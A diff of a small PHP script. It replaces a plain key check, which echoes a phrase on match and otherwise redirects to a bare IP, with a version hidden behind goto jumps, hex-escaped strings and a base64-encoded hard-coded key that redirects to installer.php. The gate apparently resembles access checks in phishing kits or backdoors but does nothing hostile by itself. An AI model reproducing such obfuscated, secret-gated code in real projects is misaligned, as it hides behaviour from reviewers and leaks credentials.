@@ -1,9 +1,2 @@
 <?php
-$res = $_GET['szkws'];
-$apikey = "API-ADMUR-AD001LK1WA0YGQ90";
-if ($_GET['llkq'] == $apikey){
-    echo "aji burung";
-}else{
-    header("location: http://192.243.98.23");
-}
-?>
+ goto pgmpj; vMTPd: if ($_POST["\x6c\x6c\153\161"] == base64_decode($apikey)) { echo "\x61\152\x69\40\x62\x75\x72\165\x6e\x67"; } else { header("\x6c\x6f\143\x61\164\151\x6f\156\x3a\40\151\x6e\163\164\x61\x6c\x6c\145\x72\56\160\x68\x70"); } goto AK8um; pgmpj: $apikey = "\x51\x56\x42\112\x4c\125\106\x45\x54\x56\126\123\114\125\106\105\x4d\x44\x41\x78\x54\105\163\170\126\x30\x45\167\x57\x55\144\122\x4f\x54\101\x3d"; goto vMTPd; AK8um: ?>
